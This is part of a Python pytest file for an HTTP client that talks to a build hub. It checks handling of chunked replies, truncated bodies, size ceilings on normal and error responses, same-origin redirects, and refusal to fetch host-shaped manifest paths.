        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        with pytest.raises(HubError) as raised:
            Hub(url, "token", timeout=10).job("abc")
        assert "stopped sending" in str(raised.value)
    finally:
        server.shutdown()
        server.server_close()


def test_a_complete_reply_carrying_BOTH_framings_is_not_called_truncated():
    """`Transfer-Encoding: chunked` wins and `Content-Length` is ignored — by
    the standard and by `http.client`, which sets `.length` only when the reply
    is not chunked. Reading the HEADER instead refused a complete reply as
    short, in the same breath as a docstring calling a chunked answer legal."""
    body = b'{"ok": true}'

    class Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            # Both, and they disagree: the chunked framing is the true one.
            self.send_header("Content-Length", "99999")
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            self.wfile.write(b"%x\r\n" % len(body) + body + b"\r\n0\r\n\r\n")

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        assert Hub(url, "token", timeout=10).start() == {"ok": True}
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("count, expected", [
    (64 * 1024 * 1024, "64 MiB"),
    (256 * 1024 * 1024, "256 MiB"),
    (4096, "4 KiB"),
    (512, "512 bytes"),
])
def test_a_ceiling_is_printed_as_the_number_that_was_configured(count, expected):
    """`cap / 1e6` turned 64 MiB into "67 MB" and a lowered ceiling into "0 MB".

    Neither number appears in `limits.py`, in the settings or in anything the
    hub answers, so somebody grepping for the one in the message found nothing.
    """
    from hammerola import hub as hub_module

    assert hub_module._bytes_text(count) == expected


# -- a reply that stopped early ---------------------------------------------
@pytest.fixture
def truncated():
    """A server that declares 40 bytes, sends 10 and hangs up. -> its url."""
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", "40")
            self.end_headers()
            self.wfile.write(b"0123456789")
            self.close_connection = True

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        yield url
    finally:
        server.shutdown()
        server.server_close()


def test_a_reply_shorter_than_it_declared_is_refused_and_not_returned(
        truncated):
    """The integrity check the CAP took away, restored explicitly.

    `response.read()` raises `IncompleteRead` on a short body; `response.read(n)`
    does not — it returns what arrived and closes the connection. Moving to the
    capped read was right and it silently removed the only check this reply had.
    """
    with pytest.raises(HubError) as raised:
        Hub(truncated, "token", timeout=10).fetch_path("/start/template.tar.gz")
    message = str(raised.value)
    assert "10" in message and "40" in message
    assert "Nothing was kept" in message


def test_a_truncated_ARTEFACT_is_refused_rather_than_handed_back_short(
        truncated):
    """THE ONE THAT MATTERS, and the reason this is a pair.

    A JSON reply and a tar verify themselves — a short one fails to parse — so
    the paths with a format behind them were never the exposure. An artefact has
    none: `hammerola artifacts` writes what it is given, prints the shortened
    size and exits zero, so a truncated `.stl` lands on disk looking like a
    finished file with nothing anywhere saying otherwise.
    """
    hub = Hub(truncated, "token", timeout=10)
    with pytest.raises(HubError) as raised:
        hub.build_file("demo0001", "latest", "body.stl")
    assert "Nothing was kept" in str(raised.value)


def test_a_manifest_naming_something_host_shaped_is_not_followed(elsewhere):
    """The cheap shape check in `fetch_path`, which nothing observed.

    It is not the protection — `_SameOriginRedirects` is, and the docstring
    says so — but it is still a guard, and a guard whose removal changes
    nothing observable is one nobody can tell has gone. A manifest naming
    `//host/x` is a manifest writing an address where a path belongs, and this
    refuses to fetch it at all.
    """
    hub = Hub(elsewhere, "token", timeout=10)

    with pytest.raises(HubError) as raised:
        hub.fetch_path("//elsewhere.example/x")
    assert "not a path on this hub" in str(raised.value)
    assert _Recorder.seen == [], "it was fetched anyway"

    # ...and the same for a path that is not a path at all.
    with pytest.raises(HubError):
        hub.fetch_path("start/template.tar.gz")
    assert _Recorder.seen == []


def test_a_redirect_within_the_hub_is_still_followed():
    """The refusal is about the ORIGIN, not about redirects: a hub that answers
    a trailing-slash 302 to itself has to go on working."""
    state = {"url": None}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path != "/moved":
                self.send_response(302)
                self.send_header("Location", f"{state['url']}/moved")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            body = b'{"landed": true}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    state["url"] = url
    try:
        assert Hub(url, "token", timeout=10).start() == {"landed": True}
    finally:
        server.shutdown()
        server.server_close()


BIG_BODY = b"x" * (64 * 1024)


@pytest.fixture
def big_body(request):
    """A server that answers 64 KB to anything. -> its url.

    THE STATUS IS A PARAMETER, and that is not decoration. There are TWO reads
    of a body in `Hub._call` and only one of them is on the 200: urllib raises
    `HTTPError` for a 4xx/5xx, and the body of that exception is read by a
    second call to `_read_capped`. A fixture that could only answer 200 left
    that second one covered by nothing — swapping it for a plain `error.read()`
    kept the suite green, while a hub answering 500 with a gigabyte fills the
    same memory as one answering 200 with it.
    """
    status = getattr(request, "param", 200)

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(status)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(BIG_BODY)))
            self.end_headers()
            self.wfile.write(BIG_BODY)

        def log_message(self, *args):
            pass

    url, server = _serve(Handler)
    try:
        yield url
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("big_body", [200, 500], indirect=True)
def test_a_reply_bigger_than_this_tool_will_hold_is_refused_as_it_is_read(
        monkeypatch, big_body):
    """Capped as it is READ, so the memory is never taken.

    The ceiling is lowered for the test rather than a hundred megabytes being
    sent: what is under test is that the read stops, not the number.

    Run against BOTH statuses, because they take different paths out of urllib
    and each does its own read — the 500 is the one that was uncovered.
    """
    from hammerola import hub as hub_module

    monkeypatch.setattr(hub_module, "MAX_REPLY_BYTES", 1024)

    with pytest.raises(HubError) as raised:
        Hub(big_body, "token", timeout=10).fetch_path("/start/template.tar.gz")
    message = str(raised.value)
    assert "nothing was kept" in message
    # ...and the ceiling is named as the number that was set. `cap / 1e6` was
    # here and printed this one as "0 MB", and the production 64 MiB as "67".
    assert "1 KiB" in message, message


def test_an_artefact_is_held_to_the_BUILD_ceiling_and_not_to_the_push_one(
        monkeypatch, big_body):
    """A part the hub published must not be one `artifacts` refuses to fetch.

    Both ceilings are lowered so the SAME 64 KB body lands on either side of the
    line: over what a push may be, under what one build may write. The push-sized
    routes refuse it and the artefact route takes it, which is the whole reason
    there are two numbers — one ceiling for both meant the hub serving an STL the
    client would not accept, with a message saying no reply may be that big.
    """
    from hammerola import hub as hub_module

    monkeypatch.setattr(hub_module, "MAX_REPLY_BYTES", 1024)
    monkeypatch.setattr(hub_module, "MAX_ARTIFACT_REPLY_BYTES", 1024 * 1024)
    hub = Hub(big_body, "token", timeout=10)

    fetched = hub.build_file("demo0001", "latest", "body.stl")
    assert fetched == BIG_BODY

    with pytest.raises(HubError):
        hub.revision_archive("a" * 64)


def test_the_artefact_ceiling_is_a_BIGGER_number_and_not_the_absence_of_one(
        monkeypatch, big_body):
    """The other half of the pair, and the one that keeps it honest.

    "Artefacts get their own ceiling" is a licence to hold more, not a licence
    to hold whatever arrives: the route is public and takes no token, so a hub
    that was mistyped answers it as readily as the right one. With the artefact
    number below the body, the same fetch that succeeds above is refused —
    which is what says the second ceiling is applied at all.
    """
    from hammerola import hub as hub_module

    monkeypatch.setattr(hub_module, "MAX_REPLY_BYTES", 1024)
    monkeypatch.setattr(hub_module, "MAX_ARTIFACT_REPLY_BYTES", 4096)

    with pytest.raises(HubError) as raised:
        Hub(big_body, "token", timeout=10).build_file(
            "demo0001", "latest", "body.stl")
    assert "nothing was kept" in str(raised.value)
